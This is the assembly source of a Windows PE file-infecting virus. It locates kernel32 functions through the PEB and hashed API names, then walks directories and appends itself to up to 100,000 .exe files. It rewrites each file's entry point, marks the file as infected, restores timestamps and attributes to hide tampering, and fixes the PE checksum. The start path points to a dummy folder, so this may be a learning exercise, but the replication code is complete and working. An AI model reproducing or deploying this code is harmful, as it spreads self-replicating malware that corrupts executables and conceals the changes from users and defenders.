%include "io.inc"
%include "./common.inc"

virusLen    equ endOfVirus - startOfVirus
COUNT       equ 100000

global _main

struc DATA
    .EIP:                     resd 1

    ; kernel data
    .kernelAddress:           resd 1
    .nFunctions:              resd 1
    .functionsAddr:           resd 1
    .namesAddr:               resd 1
    .ordinalsAddr:            resd 1

    ; API method addresses
    .functionIndex:           resd 1
    .addressStart:
    .CloseHandle:             resd 1
    .CreateFileA:             resd 1
    .CreateFileMappingA:      resd 1
    .FindClose:               resd 1
    .FindFirstFileA:          resd 1
    .FindNextFileA:           resd 1
    .GetFileAttributesA:      resd 1
    .GetFileSize:             resd 1
    .GetFileTime:             resd 1
    .GetStdHandle:            resd 1
    .MapViewOfFile:           resd 1
    .SetEndOfFile:            resd 1
    .SetFileAttributesA:      resd 1
    .SetFilePointer:          resd 1
    .SetFileTime:             resd 1
    .UnmapViewOfFile:         resd 1
    .WriteFile:               resd 1
    .lstrcat:                 resd 1
    .lstrcpy:                 resd 1

    ; directory listing data
    .findData:                resb FIND_DATA.size
    .fileMask:                resb 5 ; to store "\*.*"
    .backslash:               resb 2 ; "\", 0   ; 0x5C ; "\"
    .findHandle:              resd 1
    .counter:                 resd 1 ; COUNT
    .currentPath:             resb MAX_PATH_LENGTH
    .searchPath:              resb MAX_PATH_LENGTH  

    ; infection data
    .fileAlign:               resd 1
    .memoryToReserve:         resd 1
    .infectionFlag:           resd 1
    .fileAttributes:          resd 1
    .newFileSize:             resd 1
    .fileHandle:              resd 1
    .lastWriteTime:           resq 1
    .lastAccessTime:          resq 1
    .creationTime:            resq 1
    .mapHandle:               resd 1
    .mapAddress:              resd 1
    .PEHeader:                resd 1
    .oldEntryPoint:           resd 1
    .newEntryPoint:           resd 1
    .imageBase:               resd 1
    .oldLastSectionRawSize:   resd 1
    .newLastSectionRawSize:   resd 1
    .incRawSize:              resd 1
    .codeHeaderAddress:       resd 1
    .lastHeaderAddress:       resd 1
    .diskEP:                  resd 1
    .virusAddress:            resd 1
    .virusLocation:           resd 1
    .oldVSOfLast:             resd 1

    ; payload data    
    .overlapped:              resb OVERLAPPED.size
    
    .size:
endstruc


%if DEBUG
section .data
     counter                  dd 1
%endif

section .text
_main:
    mov     eax, virusLen   ; REMOVE
    
startOfVirus:    

    call    anchor                              ; retrieve current location (valeu of EIP)
anchor:
    pop     eax

    ; create stack frame for the local variables
    push    ebp                                 ; save old ebp
    sub     esp, DATA.size                      ; allocate local variables
    mov     ebp, esp                            ; set ebp for variable indexing
    ;PRINTH  "ebp", ebp
    ;PRINTH  "esp", esp

    mov [ebp + DATA.EIP], eax                   ; save location EIP

    ; Figure out kernel32.dll's location
    mov     edi, [FS : 0x30]                    ; PEB
    mov     edi, [edi + 0x0C]                   ; PEB->Ldr
    mov     edi, [edi + 0x14]                   ; PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
    mov     edi, [edi]                          ; 2nd Entry
    mov     edi, [edi]                          ; 3rd Entry
    mov     edi, [edi + 0x10]                   ; Third entry's base address (Kernel32.dll)
    mov     [ebp + DATA.kernelAddress] , edi

    mov     eax, [edi + 0x3C]                   ; kernelAddress points to the DOS header, read PE RVA at 0x3C
    add     eax, edi                            ; eax has the virtual address of the PE header
    mov     eax, [eax + 0x78]                   ; The export table RVA is at 0x78 from the start of PE header
    add     eax, edi                            ; eax has the virtual address of the export table
    mov     ecx, [eax + 0x14]                   ; The number of functions is at 0x14 in the export table
    mov     [ebp + DATA.nFunctions], ecx
    mov     ecx, [eax + 0x1C]                   ; RVA of array of function RVAs is at 0x1c
    add     ecx, edi                            ; convert to virtual address
    mov     [ebp + DATA.functionsAddr], ecx     ; save
    mov     ecx, [eax + 0x20]                   ; RVA of array of function name RVAs is at 0x20
    add     ecx, edi                            ; convert to virtual address
    mov     [ebp + DATA.namesAddr], ecx         ; save
    mov     ecx, [eax + 0x24]                   ; RVA of array of function ordinals is at 0x24
    add     ecx, edi                            ; convert to virtual address
    mov     [ebp + DATA.ordinalsAddr], ecx      ; save

    mov     ecx, [ebp + DATA.nFunctions]        ; loop counter
    mov     esi, [ebp + DATA.namesAddr]         ; iterate over array of functions names,
                                                ; which are pointers to zero-terminated strings

    mov     [ebp + DATA.functionIndex], dword 0 ; clear the function index

loopOverNames:
    xor     edx, edx                            ; edx will store the place where to put the address of the function
    mov     eax, [esi]                          ; read the pointer to the name string
    add     eax, edi                            ; convert to virtual address
        push    ecx
        xor     ebx, ebx                        ; the hash code will be computed in ebx
        xor     ecx, ecx                        ; the next character
     hashLoop:
        mov     cl, byte [eax]
        cmp     cl, 0
        jz hashDone
        mov     edx, ebx                        ; save old hash
        shl     ebx, 5                          ; multiply by 32
        sub     ebx, edx                        ; subtract a hash, i.e. multiply by 31
        add     ebx, ecx                        ; add the next character
        inc     eax
        jmp     hashLoop
     hashDone:
        pop     ecx


    ; see if this is a function we actually need
    pusha
    mov     edx, [ebp + DATA.functionIndex]                 ; read the current function index
    mov     eax, [ebp + DATA.EIP]                           ; read EIP of virus start
    cmp     ebx, [eax + (hashStart - anchor) + 4 * edx]     ; compare computed hash with current function hash
    jne     discard                                         ; if does not match, move on
                                                            ; we have a match, compute and save the address
    mov     eax, [ebp + DATA.nFunctions]                    ; compute index of function name
    sub     eax, ecx
    shl     eax, 1                                          ; multiply index by 2
    add     eax, [ebp + DATA.ordinalsAddr]                  ; compute address of ordinal
    xor     ebx, ebx
    mov     bx, word [eax]                                  ; read ordinal
    shl     ebx, 2                                          ; prepare to read function address, multiply ordinal by 4
    add     ebx, [ebp + DATA.functionsAddr]                 ; compute address of function address
    mov     ebx, [ebx]                                      ; read function RVA
    add     ebx, edi                                        ; convert to virtual address
    mov     [ebp + DATA.addressStart + 4 * edx], ebx        ; save the address
    inc     dword [ebp + DATA.functionIndex]                ; increment the function index
discard:    
    popa

    add     esi, 4
    dec     ecx
    jnz     loopOverNames

        NOPS

    ; Now we begin with the business of infecting some files
    ;; ====================================================================================

    ; initialize local variables    
    mov     [ebp + DATA.fileMask], dword 0x00002A5C ; "\*" 
    PRINTS  "fileMask", [ebp + DATA.fileMask]
    mov     [ebp + DATA.backslash], word 0x005C ; "\"    
    mov     [ebp + DATA.counter], dword COUNT

    ; push initial path onto the stack
    sub     esp, MAX_PATH_LENGTH
    mov     edx, esp
    mov     ebx, [ebp + DATA.EIP]
    add     ebx, directory - anchor
    push    ebx
    push    edx
    call    [ebp + DATA.lstrcpy]
    ;PRINTS  "startPath", [ebx]
    
next_dir:
    cmp     ebp, esp            ; must be fixed when ported
    je      search_done
    
    push    esp                 ; pop path off the stack
    lea     edx, [ebp + DATA.currentPath]
    push    edx
    call    [ebp + DATA.lstrcpy]
    add     esp, MAX_PATH_LENGTH
    ;PRINTS  "currentPath", [ebp + DATA.currentPath]
    
    lea     edx, [ebp + DATA.currentPath]   ; copy currentPath into searchPath
    push    edx
    lea     edx, [ebp + DATA.searchPath] 
    push    edx
    call    [ebp + DATA.lstrcpy]
    ;PRINTS  "searchPath", [ebp + DATA.searchPath]
    
    lea     edx, [ebp + DATA.fileMask]            ; append the file mask
    push    edx
    lea     edx, [ebp + DATA.searchPath]
    push    edx
    call    [ebp + DATA.lstrcat]
    ;PRINTS  "searchPath", [ebp + DATA.searchPath]
    
    lea     edx, [ebp + DATA.findData]           ; find the first file
    push    edx
    lea     edx, [ebp + DATA.searchPath]
    push    edx
    call    [ebp + DATA.FindFirstFileA]
    cmp     eax, -1             ; invalid handle? 
    je      next_dir            ; no need to close the search, just move on
    mov     [ebp + DATA.findHandle], eax
    jmp     process_file        ; else process the file
    
next_file:
    lea     edx, [ebp + DATA.findData]
    push    edx
    mov     eax, [ebp + DATA.findHandle]
    push    eax
    call    [ebp + DATA.FindNextFileA]
    cmp     eax, 0
    je      close_search
    
process_file:
    ; skip '.' and '..' directories
    cmp     word [ebp + DATA.findData + FIND_DATA.cFileName], word 0x002e
    je      next_file
    cmp     word [ebp + DATA.findData + FIND_DATA.cFileName], word 0x2e2e
    je      next_file
    
    lea     edx, [ebp + DATA.currentPath]         ; get file absolute path
    push    edx
    lea     edx, [ebp + DATA.searchPath]
    push    edx
    call    [ebp + DATA.lstrcpy]
    lea     edx, [ebp + DATA.backslash]
    push    edx
    lea     edx, [ebp + DATA.searchPath]
    push    edx
    call    [ebp + DATA.lstrcat]
    lea     edx, [ebp + DATA.findData + FIND_DATA.cFileName]
    push    edx
    lea     edx, [ebp + DATA.searchPath]
    push    edx
    call    [ebp + DATA.lstrcat]
    
    mov     eax, [ebp + DATA.findData + FIND_DATA.dwFileAttributes]
    and     eax, DIRECTORY 
    cmp     eax, DIRECTORY      ; directory?
    je      dir                 ; then its a dir
    
    ; else its a file and check if exe
    xor     eax, eax
loop_findTermination:
    mov     bl, byte [ebp + DATA.findData + FIND_DATA.cFileName + eax]
    cmp     bl, 0
    je      compareEXE    
    inc     eax
    jmp     loop_findTermination    
    
compareEXE:
    mov     ebx, dword ".exe"
    mov     ecx, dword [ebp + DATA.findData + FIND_DATA.cFileName + eax - 4]    
    cmp     ebx, ecx   
    jne     next_file

    ; IF FILE AND EXE, THEN INFECT
    PRINTS  "FILE", [ebp + DATA.searchPath]    
    call    InfectFile
    
    dec     dword [ebp + DATA.counter]      ; decrement counter and loop again
    jz      search_done
    jmp     next_file
    
dir:
    sub     esp, MAX_PATH_LENGTH
    mov     ebx, esp
    lea     edx, [ebp + DATA.searchPath]
    push    edx
    push    ebx
    call    [ebp + DATA.lstrcpy]
    jmp     next_file
    
close_search:
    ;findData "closeSearch", [ebp + DATA.currentPath]
    mov     eax, [ebp + DATA.findHandle]
    push    eax
    call    [ebp + DATA.FindClose]
    jmp     next_dir

search_done:
    mov     eax, COUNT
    sub     eax, [ebp + DATA.counter]
    NEWLINE
    PRINTD "counter", eax

    ;; Now the payload of the virus
    ;; ====================================================================================
    
    push    -11                             ; hStdOut = GetstdHandle(STD_OUTPUT_HANDLE)
    call    [ebp + DATA.GetStdHandle]
    mov     edx, eax                        ; copy the stdout handle in ebx

    ; WriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, lpOverlapped);
    xor     eax, eax                                              ; 0x00000000
    not     eax                                                   ; 0xFFFFFFFF
    mov     [ebp + DATA.overlapped + OVERLAPPED.offset], eax      ; set offset to 0xFFFFFFFF
    mov     [ebp + DATA.overlapped + OVERLAPPED.offsetHigh], eax  ; set offsetHigh to 0xFFFFFFFF
    lea     eax, [ebp + DATA.overlapped]
    push    eax                             ; lpOverlapped
    push    NULL                            ; &lpNumberOfBytesWritten
    push    message_end - message           ; nNumberOfBytesToWrite
    mov     eax, [ebp + DATA.EIP]
    add     eax, message - anchor
    push    eax                             ; lpBuffer
    push    edx                             ; stdout handle
    call    [ebp + DATA.WriteFile]

    add     esp, DATA.size                  ; de-allocate local variables
    pop     ebp                             ; restore stack

    jmp     endOfVirus                      ; Get the fuck out



;; HELPER FUNCTIONS
;; ====================================================================================

InfectFile:
    pushad                                          ; Save all registers

    xor     ebx, ebx
    mov     [ebp + DATA.infectionFlag], ebx         ; Reset the infection flag
    
    mov     ecx, [ebp + DATA.findData + FIND_DATA.nFileSizeLow] ; read file size (lower 4 bytes)
    PRINTD "originalFileSize", ecx
    mov     [ebp + DATA.newFileSize], ecx           ; YYY Save file size, old size at this point
    add     ecx, virusLen                           ; ECX = victim filesize + virus
    add     ecx, 1000h                              ; ECX = victim filesize + virus + 1000h
    mov     [ebp + DATA.memoryToReserve], ecx       ; Memory to map
    PRINTD "memoryToReserve", ecx

    ;; save the original attributes

    lea     ebx, [ebp + DATA.searchPath]
    push    ebx                                     ; Address to filename
    call    [ebp + DATA.GetFileAttributesA]         ; Get the file attributes
    cmp     eax, -1                                 ; YYY
    mov     [ebp + DATA.fileAttributes], eax
    PRINTH  "fileAttributes", eax

    ;; set the nomral attributes to the file

    push    80h                                     ; 80h = FILE_ATTRIBUTE_NORMAL
    lea     ebx, [ebp + DATA.searchPath]
    push    ebx                                     ; Address to filename
    call    [ebp + DATA.SetFileAttributesA]         ; Get the file attributes

    ;; open the file

    push    0                                       ; File template
    push    0                                       ; File attributes
    push    3                                       ; Open existing file
    push    0                                       ; Security option = default
    push    1                                       ; File share for read
    mov     ebx, WRITABLE
    or      ebx, READABLE
    push    ebx                                     ; General write and read
    lea     ebx, [ebp + DATA.searchPath]
    push    ebx                                     ; Address to filename
    call    [ebp + DATA.CreateFileA]                ; create the file, EAX = file handle
    cmp     eax, -1                                 ; error ?
    je      InfectionError                          ; cant open the file ?
    mov     [ebp + DATA.fileHandle], eax            ; Save file handle
    PRINTH  "fileHandle", eax

    ;; save File creation time, Last write time, Last access time

    lea     ebx, [ebp + DATA.lastWriteTime]
    push    ebx
    lea     ebx, [ebp + DATA.lastAccessTime]
    push    ebx
    lea     ebx, [ebp + DATA.creationTime]
    push    ebx
    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.GetFileTime]                
    PRINTD  "GetFileTime", eax

    ;; create file mapping for the file
;HANDLE WINAPI CreateFileMapping(
;  _In_     HANDLE                hFile,
;  _In_opt_ LPSECURITY_ATTRIBUTES lpAttributes,
;  _In_     DWORD                 flProtect,
;  _In_     DWORD                 dwMaximumSizeHigh,
;  _In_     DWORD                 dwMaximumSizeLow,
;  _In_opt_ LPCTSTR               lpName
;);
;
    push    0                                       ; Filename handle = NULL
    mov     ebx, [ebp + DATA.memoryToReserve]           ; Max size
    push    ebx
    push    0                                       ; Min size (no need)
    push    4                                       ; Page read and write
    push    0                                       ; Security attributes
    mov     ebx, [ebp + DATA.fileHandle]            ; File handle
    push    ebx
    call    [ebp + DATA.CreateFileMappingA]         ; map file to memory, EAX = new map handle
    call    _GetLastError@0
    PRINTD  "CreateFileMapping handle", eax
    cmp     eax, 0                                  ; Error ?
    je      CloseFile                               ; Cant map file ?
    mov     [ebp + DATA.mapHandle], eax             ; Save map handle
    ;PRINTD  "CreateFileMapping handle", eax

    ;; map the view of that file

    PRINTD "memoryToReserve", [ebp + DATA.memoryToReserve]
    mov     ebx, [ebp + DATA.memoryToReserve]           ; # Bytes to map
    push    ebx
    push    0                                       ; File offset low
    push    0                                       ; File offset high
    push    2                                       ; File Map Write Mode
    mov     ebx, [ebp + DATA.mapHandle]             ; File Map Handle
    push    ebx
    call    [ebp + DATA.MapViewOfFile]              ; map file to memory

    cmp     eax, 0                                  ; Error ?
    je      CloseMap                                ; Cant map view of file ?
    mov     esi, eax                                ; ESI = base of file mapping
    mov     [ebp + DATA.mapAddress], esi            ; Save base of file mapping
    PRINTH  "fileMapAddress", esi
    
    ;; check whether the mapped file is a PE file and see if its already been infected

    cmp     word [esi + DOS.signature], ZM          ; 'ZM' Is it an EXE file ? (ie Does it have 'MZ' at the beginning?)
    jne     UnmapView                               ; Error ?
    cmp     word [esi + AD_OFFSET], AD              ; 'AD'  ; Already infected ?
    jne     OkGo                                    ; Is it a PE EXE file ?
    mov     word [ebp + DATA.infectionFlag], AD     ; Mark it
    jmp     UnmapView                               ; Error ?

OkGo:
    mov     ebx, [esi + DOS.lfanew]                 ; EBX = PE Header RVA
    cmp     word [esi + ebx], EP                    ; 'EP'  ; Is it a PE file ?
    jne     UnmapView                               ; Error ?
    PRINT_TRACE ;2

    ;; If the file is not EXE, is already infected or is not a PE file, we proceed to
    ;; unmap the view of file, otherwise parse the PE Header.

    add     esi, ebx                                ; (ESI points to PE header now)
    mov     [ebp + DATA.PEHeader], esi              ; Save PE header
    mov     eax, [esi + PE.Machine]                 ; read machine field in PE Header
    cmp     ax, INTEL386                            ; 0x014c = Intel 386
    jnz     UnmapView                               ; if not 32 bit, then error and quit
    mov     eax, [esi + PE.AddressOfEntryPoint]     
    mov     [ebp + DATA.oldEntryPoint], eax         ; Save Entry Point of file
    mov     eax, [esi + PE.ImageBase]               ; Find the Image Base
    mov     [ebp + DATA.imageBase], eax             ; Save the Image Base
    mov     eax, [esi + PE.FileAlignment]
    mov     dword [ebp + DATA.fileAlign], eax       ; Save File Alignment ; (EAX = File Alignment)
    PRINT_TRACE ;3
    
    mov     ebx, [esi + PE.NumberOfRvaAndSizes]     ; Number of directories entries, PE + 0x74
    shl     ebx, 3                                  ; * 8 (size of data directories)
    add     ebx, PE.size                            ; add size of PE header
    add     ebx, [ebp + DATA.PEHeader]              ; EBX = address of the .text section
    mov     [ebp + DATA.codeHeaderAddress], ebx     ; save codeHeaderAddress
    PRINT_TRACE ;4

    ;; Locate the last section in the PE

    push    esi

    mov     ebx, [esi + PE.NumberOfRvaAndSizes]     ; Number of directories entries
    shl     ebx, 3                                  ; * 8 (size)
    xor     eax, eax
    mov     ax, word [esi + PE.NumberOfSections]    ; AX = number of sections
    dec     eax                                     ; Look for the last section ending
    mov     ecx, SECTIONH.size                      ; ECX = size of sections header
    mul     ecx                                     ; EAX = ECX * EAX
    add     esi, PE.size
    add     esi, ebx
    add     esi, eax                                ; ESI = Pointer to the last section header
    mov     [ebp + DATA.lastHeaderAddress], esi

    PRINT_TRACE ;5

    mov     ebx, [ebp + DATA.codeHeaderAddress]     ; EBX points to the code header
    mov     eax, [ebx + SECTIONH.PointerToRawData]  ; pointer to raw data of code segment
    add     eax, [ebx + SECTIONH.VirtualSize]       ; virtual size of code segment
    mov     [ebp + DATA.diskEP], eax                ; where exectuable code is (entryPoint will jump here)

    PRINT_TRACE ;6

    mov     eax, [ebp + DATA.imageBase]             ; ESI = Pointer to the last section header
    add     eax, [esi + SECTIONH.VirtualAddress]    ; VirtualAddress
    add     eax, [esi + SECTIONH.VirtualSize]       ; VirtualSize
    mov     [ebp + DATA.virusAddress], eax

    PRINT_TRACE ;7
                                                    ; ESI = Pointer to the last section header
    mov     eax, [esi + SECTIONH.PointerToRawData]  ; reading PointerToRawData
    add     eax, [esi + SECTIONH.VirtualSize]       ; reading VirtualSize
    mov     [ebp + DATA.virusLocation], eax

    PRINT_TRACE ;8

    pop   ebx                                       ; restore old PE header into ebx

    or      dword [esi + SECTIONH.Characteristics], CODE | EXECUTABLE   ; Set [CWE] flags (CODE)

    ;; The flags tell the loader that the section now
    ;; has executable code and is writable

    mov     eax, [esi + SECTIONH.SizeOfRawData]               ; EAX = size of raw data in this section (ESI = Pointer to the last section header)
    mov     [ebp + DATA.oldLastSectionRawSize], eax           ; Save it
    mov     ecx, [esi + SECTIONH.VirtualSize]
    mov     [ebp + DATA.oldVSOfLast], ecx
    add     dword [esi + SECTIONH.VirtualSize], virusLen    ; Increase virtual size
    PRINTD "oldLastSectionRawSize", [ebp + DATA.oldLastSectionRawSize]

    ;; Update ImageBase

    ;mov     eax, [esi + SECTIONH.VirtualSize]               ; Get new size in EAX
    ;add     eax, [esi + SECTIONH.VirtualAddress]            ; + section rva
    ;mov     [ebx + PE.SizeOfImage], eax                     ; Save SizeOfImage

    ;; The size of raw data is the actual size of the
    ;; data in the section, The virtual size is the one
    ;; we must increase with our virus size, Now after
    ;; the increasing, lets check how much did we mess
    ;; the file align, To do that we divide the new size
    ;; to the filealign value and we get as a reminder
    ;; the number of bytes to pad

    mov     eax, [esi + SECTIONH.VirtualSize]               ; Get new size in EAX
    mov     ecx, [ebp + DATA.fileAlign]                     ; ECX = File alignment
    div     ecx                                             ; Get remainder in EDX
    mov     ecx, [ebp + DATA.fileAlign]                     ; ECX = File alignment
    sub     ecx, edx                                        ; Number of bytes to pad
    mov     [esi + SECTIONH.SizeOfRawData], ecx             ; Save it
    PRINT_TRACE ;9

    ;; Now size of raw data = number of bytes to pad

    mov     eax, [esi + SECTIONH.VirtualSize]               ; Get current VirtualSize
    add     eax, [esi + SECTIONH.SizeOfRawData]             ; EAX = SizeOfRawdata padded
    mov     [esi + SECTIONH.SizeOfRawData], eax             ; Set new SizeOfRawdata

    ;; Now size of raw data = old virtual size + number of bytes to pad

    mov     [ebp + DATA.newLastSectionRawSize], eax                    ; Save it
    PRINTD "newLastSectionRawSize", [ebp + DATA.newLastSectionRawSize]

    ;; The virus will be at the end of the section, In
    ;; order to find its address we have the following formula:
    ;; VirtualAddress + VirtualSize - VirusLength + RawSize = VirusStart

    mov     eax, [ebp + DATA.codeHeaderAddress]
    mov     ebx, [ebp + DATA.codeHeaderAddress]
    mov     eax, [ebx + SECTIONH.VirtualAddress]            ; Reading code segment's RVA
    add     eax, [ebx + SECTIONH.VirtualSize]               ; Add the size of the segment
    PRINT_TRACE;11
    mov     [ebp + DATA.newEntryPoint], eax                 ; EAX = new EIP, and save it
    PRINT_TRACE;12

    ;; Here we compute with how much did we increase the size of raw data

    mov     eax, [ebp + DATA.oldLastSectionRawSize]                ; Original SizeOfRawdata
    mov     ebx, [ebp + DATA.newLastSectionRawSize]                ; New SizeOfRawdata
    sub     ebx, eax                                    ; Increase in size
    mov     [ebp + DATA.incRawSize], ebx                ; Save increase value
    PRINT_TRACE ;13

    ;; Compute the new file size                         

    mov     eax, [esi + SECTIONH.PointerToRawData]      ; Read PointerToRawData from last section's header
    PRINTD "PointerToRawData", eax
    add     eax, [ebp + DATA.newLastSectionRawSize]                ; Add size of new raw data
    mov     [ebp + DATA.newFileSize], eax               ; EAX = new filesize, and save it
    PRINTD "newFileSize", [ebp + DATA.newFileSize]

    ;; Now prepare to copy the virus to the host, The formulas are                                 

    mov     eax, [ebp + DATA.diskEP]                    ; Align in memory to map address
    add     eax, [ebp + DATA.mapAddress]

    mov     [eax], byte JMP_NR                          ; relative near jump instruction
    mov     ebx, [ebp + DATA.lastHeaderAddress]
    mov     ebx, [ebx + SECTIONH.VirtualAddress]        ; lastSegment address
    PRINTH "lastSegment address", ebx
    mov     ecx, [ebp + DATA.codeHeaderAddress]
    sub     ebx, [ecx + SECTIONH.VirtualAddress]        ; - codeSegment address
    PRINTH "codeSegment address", [ecx]
    add     ebx, [ebp + DATA.oldVSOfLast]               ; + lastSegment size
    PRINTH "lastSegment size", [ecx]
    mov     ecx, [ebp + DATA.codeHeaderAddress]         ; ECX points to the code header
    sub     ebx, [ecx + SECTIONH.VirtualSize]           ; - codeSegment size
    PRINTH "codeSegment size", [ecx]
    sub     ebx, JMP_NR_BYTES                           ; subtract length of the jump instruction (it takes up 5 bytes of space)
    mov     [eax + 1], ebx                              ; write the 4 byte address of the JMP
    PRINTH "relative address jump", ebx
    PRINT_TRACE ;14
    
    mov     edi, [ebp + DATA.virusLocation]    ; Location to copy the virus to
    add     edi, [ebp + DATA.mapAddress]
    mov     eax, [ebp + DATA.EIP]
    lea     esi, [eax - JMP_NR_BYTES]          ; Location to copy the virus from
    mov     ecx, virusLen                      ; Number of bytes to copy
    rep     movsb                              ; Copy all the bytes
    PRINT_TRACE ;15

    mov     eax, virusLen
    PRINTD "virusLen", eax
    add     eax, [ebp + DATA.virusLocation]
    add     eax, [ebp + DATA.mapAddress]

    PRINT_TRACE ;16

    ; Transfer execution to the host entry point
    
    mov     ecx, [ebp + DATA.codeHeaderAddress]
    add     ebx, [ecx + SECTIONH.VirtualSize]   ; add Size of CodeSegment
    sub     ebx, [ebp + DATA.oldEntryPoint]     ; subtract old entry point
    add     ebx, 0x1000                         ; correct for BaseOfCode
    add     ebx, 2*JMP_NR_BYTES                 ; correct for 2 near JMPs (2 x 5 bytes)
    add     ebx, virusLen                       ; add virusLength
    neg     ebx
    mov     [eax], byte JMP_NR                  ; relative near jump instruction
    mov     [eax + 1], ebx                      ; write the 4 byte address of the JMP
    PRINT_TRACE ;17
    PRINTH "ebx", ebx
    
    ;; Now increase the size of the code segment by the length of the JMP instruction (5 bytes)    
    add     dword [ecx + SECTIONH.VirtualSize], JMP_NR_BYTES    

    ;; Now, lets alter the PE header by marking the new IP, increasing the total 
    ;; size of the files image with the increasing of the last section

    PRINT_TRACE ;18
    mov     esi, [ebp + DATA.PEHeader]              ; ESI = Address of PE header
    mov     eax, [ebp + DATA.newEntryPoint]         ; Get value of new EIP in EAX
    PRINT_TRACE ;19
    mov     [esi + PE.AddressOfEntryPoint], eax     ; Write it to the PE header

    PRINT_TRACE ;20

    ;; Now, lets mark the file as infected

    mov     esi, [ebp + DATA.mapAddress]
    mov     word [esi + AD_OFFSET], AD              ;'AD'  ; Mark file as infected
    PRINT_TRACE ;16
    
    ;; Now recompute the PE checksum
    
    mov     edx, [ebp + DATA.PEHeader]              ; EDX = Address of PE header
    mov     eax, [edx + PE.CheckSum]
    PRINTH  "oldChecksum", eax
    mov     [edx + PE.CheckSum], dword 0            ; clear the old checksum
    mov     edx, [ebp + DATA.mapAddress]
    mov     ecx, [ebp + DATA.newFileSize]
    call    PECheckSum
    mov     edx, [ebp + DATA.PEHeader]              ; save the new checksum
    mov     [edx + PE.CheckSum], eax                
    PRINTH  "newChecksum", eax            
    
UnmapView:
    mov     ebx, [ebp + DATA.mapAddress]
    push    ebx
    call    [ebp + DATA.UnmapViewOfFile]
    PRINT_TRACE

CloseMap:
    mov     ebx, [ebp + DATA.mapHandle]
    push    ebx
    call    [ebp + DATA.CloseHandle]
    PRINT_TRACE

CloseFile:
    lea     ebx, [ebp + DATA.lastWriteTime]
    push    ebx
    lea     ebx, [ebp + DATA.lastAccessTime]
    push    ebx
    lea     ebx, [ebp + DATA.creationTime]
    push    ebx
    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.SetFileTime]                ; set time fields FIXME
    PRINT_TRACE

    ;; In order to properly close the file we must set its EOF at the exact end
    ;; of file, So first we move the pointer to the end and set the EOF

    push    0                                       ; First we must set the file
    push    NULL                                    ; Pointer at the end of file (that is the beginning + new file size)
    mov     ebx, [ebp + DATA.newFileSize]
    push    ebx
    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.SetFilePointer]
    PRINT_TRACE

    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.SetEndOfFile]
    PRINT_TRACE

    ;; And finaly we close the file

    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.CloseHandle]
    PRINT_TRACE

    ;; Then we must restore file attributes

    mov     ebx, [ebp + DATA.fileAttributes]
    push    ebx
    lea     ebx, [ebp + DATA.searchPath]
    push    ebx                                     ; Push the address of the search record
    PRINT_TRACE
    call    [ebp + DATA.SetFileAttributesA]
    PRINT_TRACE

    jmp     InfectionSuccessful

InfectionError:
    stc
    jmp     OutOfHere

InfectionSuccessful:
    PRINT_TRACE
    mov     eax, 15
    cmp     word[ebp + DATA.infectionFlag], AD
    je      InfectionError
    clc                                             ; clear CARRY flag

OutOfHere:
  PRINT_TRACE
    popad                                           ; Restore all registers
  
    retn


;; Calculates the checksum that is to be stored in the PE header
;;  Input:  edx - buffer pointer, ecx - buffer length
;;  Output: eax - the checksum
PECheckSum:
    push    ecx         ; save the length for later
    shr     ecx, 2      ; we're summing DWORDs, not bytes 
    xor     eax, eax    ; EAX holds the checksum     
    clc                 ; Clear the carry flag ready for later... 
    
    theLoop: ; the file is being iterated backwards
    adc	eax, [edx + (ecx * 4) - 4] 
    dec	ecx 
    jnz	theLoop 

    mov     ecx, eax       ; EDX = EAX - the checksum
    shr     ecx, 16        ; EDX = checksum >> 16      EDX is high order
    and     eax, 0xFFFF    ; EAX = checksum & 0xFFFF   EAX is low order
    add     eax, ecx       ; EAX = checksum & 0xFFFF + checksum >> 16      High Order Folded into Low Order
    mov     ecx, eax       ; EDX = checksum & 0xFFFF + checksum >> 16    
    shr     ecx, 16        ; EDX = EDX >> 16      EDX is high order
    add     eax, ecx       ; EAX = EAX + EDX      High Order Folded into Low Order
    and     eax, 0xFFFF    ; EAX = EAX & 0xFFFF   EAX is low order 16 bits    
    
    pop     ecx            ; restore original file length
    add     eax, ecx       ; add the file size
    
    retn 


    ;; Constant data section
    ;; ====================================================================================

    directory:                db "C:\assembly\Dummies", 0
    message:                  db 'Good morning America!', 10
    message_end:

    hashStart:
     CloseHandle:             dd 0x59e68620
     CreateFileA:             dd 0x44990e89
     CreateFileMappingA:      dd 0xa481360b
     FindClose:               dd 0x8f86c39f
     FindFirstFileA:          dd 0x79e4b02e
     FindNextFileA:           dd 0x853fd939
     GetFileAttributesA:      dd 0xbcd7bc98
     GetFileSize:             dd 0xb36c10f3
     GetFileTime:             dd 0xb36c83bf
     GetStdHandle:            dd 0xe0557795 ; delete
     MapViewOfFile:           dd 0xcbee3954
     SetEndOfFile:            dd 0xbdca5e8c
     SetFileAttributesA:      dd 0xf3ae560c
     SetFilePointer:          dd 0x8dce837f
     SetFileTime:             dd 0xae24e4cb
     UnmapViewOfFile:         dd 0x7f75f35b
     WriteFile:               dd 0x2398d9db ; delete
     lstrcat:                 dd 0x1bf64771
     lstrcpy:                 dd 0x1bf64947


    NOPS


endOfVirus:

    push    0
    call    _ExitProcess@4
